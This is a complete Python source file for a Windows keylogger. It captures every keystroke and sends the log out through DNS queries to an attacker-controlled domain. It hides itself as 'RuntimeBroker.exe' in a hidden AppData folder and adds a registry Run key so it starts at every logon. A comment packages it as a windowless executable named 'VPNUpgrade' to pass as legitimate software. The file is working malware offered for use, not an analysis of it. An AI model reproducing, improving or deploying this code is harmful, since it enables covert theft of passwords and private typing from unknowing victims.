#py -m PyInstaller --onefile --noconsole --name "VPNUpgrade" --icon .\runtimebroker.ico --clean --version-file version.txt keylogger.py
#Komputer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
import keyboard
from threading import Timer, Lock
import time

import threading
import base64
import socket

import os
import sys
import shutil
import winreg
import subprocess

# CONFIG
SendReport = 30                 # report time interval in seconds
serverSuffix = ""               # NS delegated domain
CLIENT_ID = 10001               # id number 0–65535

#golbal session id do not edit
session_counter = 0
session_lock = Lock()

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        # this is the string variable that contains the log of all the keystrokes within `self.interval`
        self.log = ""

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def dns_exfiltrate(self, data: bytes):
        """
        Send log string directly to the server via DNS.
        Splits data into chunks, encodes with Base32 and sends as subdomains of `serverSuffix`.
        Payload format: CLIENT_ID (2B) + session_id (1B) + seq (1B) + data chunk.
        """
        global session_counter
        with session_lock:
            session_id = session_counter & 0xFF   # keep within 1 byte (0–255)
            session_counter += 1

        # Split into chunks – max 113 bytes (header: 2+1+1=4 bytes)
        chunk_size = 113
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

        for seq, chunk in enumerate(chunks):
            # Build payload: 2 bytes CLIENT_ID + 1 byte session_id + 1 byte seq + data fragment
            client_high = (CLIENT_ID >> 8) & 0xFF
            client_low  = CLIENT_ID & 0xFF
            payload = bytes([client_high, client_low, session_id, seq & 0xFF]) + chunk

            # Base32 encode without padding '='
            encoded = base64.b32encode(payload).decode().rstrip("=")

            # Split into DNS labels (max 63 characters each)
            labels = []
            while len(encoded) > 0:
                labels.append(encoded[:63])
                encoded = encoded[63:]

            # Full domain name: label1.label2....serverSuffix
            domain = ".".join(labels) + "." + serverSuffix

            # Use system resolver
            try:
                socket.gethostbyname(domain)          # trigger DNS resolution
            except socket.gaierror:
                pass                                  # ignore resolution errors

            time.sleep(0.05)  # Small delay between fragments

    def report_dns(self):
        """
        Raports log through DNS.
        Run as thread to make independent from timer.
        """
        if not self.log:
            return
        # coding log as UTF-8
        data = self.log.encode("utf-8")
        # run as independent thread
        thread = threading.Thread(target=self.dns_exfiltrate, args=(data,))
        thread.daemon = True
        thread.start()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.report_dns()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def install_persistence(self):
        """
        Installs the keylogger persistently on the target Windows system.
        Copies the current executable (or script) to a hidden folder in %APPDATA%
        disguised as 'RuntimeBroker.exe'. The file and its directory are marked
        as hidden. Adds a registry Run entry so the program launches automatically
        at user logon. Finally, starts the hidden copy and terminates the original
        process to leave no visible window.
        """
        fake_name = "RuntimeBroker.exe"

        # hidden path where we copy exe
        dest_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'RuntimeBroker')
        dest_path = os.path.join(dest_dir, fake_name)

        # if arleady there do nothing (not first runtime)
        current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if os.path.normcase(current_path) == os.path.normcase(dest_path):
            return

        # creating hidden directory
        os.makedirs(dest_dir, exist_ok=True)
        try:
            subprocess.check_call(['attrib', '+h', dest_dir],
                                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

        # copy file to hidden directory
        try:
            shutil.copy2(current_path, dest_path)
        except Exception:
            return

        # 3. hide file
        try:
            subprocess.check_call(['attrib', '+h', dest_path],
                                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

        # add registry to init autostart
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            cmd = f'"{dest_path}"'
            winreg.SetValueEx(key, "RuntimeBroker", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
        except Exception as e:
            pass

        # run hidden copy and stop current process
        subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
        os._exit(0)

    def start(self):
        # installation (pesristance)
        try:
            self.install_persistence()
        except Exception as e:
            pass
        # #     print(f"[-] Persistence failed: {e}")

        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SendReport)
    keylogger.start()